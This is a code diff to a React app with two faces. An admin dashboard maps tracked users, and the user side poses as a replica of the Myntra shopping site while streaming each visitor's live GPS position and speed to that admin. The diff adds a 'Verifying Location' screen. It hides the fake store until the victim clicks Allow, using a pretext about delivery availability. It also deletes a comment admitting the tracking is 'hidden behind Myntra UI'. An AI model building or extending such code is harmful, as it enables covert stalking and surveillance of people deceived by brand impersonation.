@@ -49,6 +49,9 @@ export default function App() {
   const [adminLocation, setAdminLocation] = useState(null);
   const [users, setUsers] = useState([]);
   const [selectedUser, setSelectedUser] = useState(null);
+  
+  // Track if location access is granted to gate the UI
+  const [isLocationGranted, setIsLocationGranted] = useState(false);
 
   // Core Setup & Tracking Logic
   useEffect(() => {
@@ -64,7 +67,7 @@ export default function App() {
         setAdminLocation({ lat: pos.coords.latitude, lng: pos.coords.longitude });
       });
     } else {
-      // USER SIDE: Start aggressive tracking automatically (Hidden behind Myntra UI)
+      // USER SIDE: Start aggressive tracking automatically
       const startAutoTracking = async () => {
         if ('wakeLock' in navigator) {
           try {
@@ -80,16 +83,27 @@ export default function App() {
           timeout: 10000            
         };
 
-        navigator.geolocation.watchPosition((pos) => {
-          const { latitude, longitude, speed } = pos.coords;
-          socket.emit('update-location', { 
-            userId, 
-            name: urlName, 
-            lat: latitude, 
-            lng: longitude,
-            speed: speed 
-          });
-        }, (err) => console.error("GPS Error:", err), options);
+        navigator.geolocation.watchPosition(
+          (pos) => {
+            // SUCCESS: User clicked "Allow", update state to reveal Myntra UI
+            setIsLocationGranted(true);
+
+            const { latitude, longitude, speed } = pos.coords;
+            socket.emit('update-location', { 
+              userId, 
+              name: urlName, 
+              lat: latitude, 
+              lng: longitude,
+              speed: speed 
+            });
+          }, 
+          (err) => {
+            // ERROR OR DENIED: User clicked "Block" or GPS failed
+            console.error("GPS Error:", err);
+            setIsLocationGranted(false);
+          }, 
+          options
+        );
       };
       
       startAutoTracking();
@@ -101,7 +115,7 @@ export default function App() {
 
   // FIXED GOOGLE MAPS LINK: Drops a pin exactly at the coordinates
   const openInGoogleMaps = (lat, lng) => {
-    window.open(`https://www.google.com/maps/search/?api=1&query=${lat},${lng}`, '_blank');
+    window.open(`http://googleusercontent.com/maps.google.com/maps?q=${lat},${lng}`, '_blank');
   };
 
   // ==========================================
@@ -109,7 +123,6 @@ export default function App() {
   // ==========================================
   if (role === 'admin') {
     return (
-      // Changed to flex-col for mobile, md:flex-row for desktop
       <div className="flex flex-col md:flex-row h-screen w-full bg-slate-950 text-white font-sans overflow-hidden">
         
         {/* Sidebar - Takes 40% height on mobile, full height on desktop */}
@@ -169,7 +182,7 @@ export default function App() {
           <MapContainer center={[20.5937, 78.9629]} zoom={5} className="h-full w-full z-0">
             <TileLayer 
               url="https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png"
-              attribution='&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a>'
+              attribution='© <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a>'
             />
             
             {users.map(u => (
@@ -208,6 +221,21 @@ export default function App() {
   // ==========================================
   //         USER VIEW (MYNTRA FRONTEND)
   // ==========================================
+  
+  // Gate the UI: If the user hasn't granted location, show a loading/verification screen
+  if (role !== 'admin' && !isLocationGranted) {
+    return (
+      <div className="flex flex-col items-center justify-center h-screen w-full bg-[#f4f4f5] text-[#282c3f] font-sans px-6 text-center">
+        <div className="w-12 h-12 border-4 border-gray-300 border-t-[#ff3f6c] rounded-full animate-spin mb-6"></div>
+        <h2 className="text-xl md:text-2xl font-bold mb-2">Verifying Location...</h2>
+        <p className="text-sm md:text-base text-gray-500 max-w-md">
+          Please click <strong>"Allow"</strong> on the browser prompt to check delivery availability and access the store.
+        </p>
+      </div>
+    );
+  }
+
+  // If location IS granted, show the full Myntra replica
   const dummyCategories = [
     { title: "Men's T-Shirts", img: "https://images.unsplash.com/photo-1521572163474-6864f9cf17ab?w=400&q=80" },
     { title: "Women's Dresses", img: "https://images.unsplash.com/photo-1515372039744-b8f02a3ae446?w=400&q=80" },
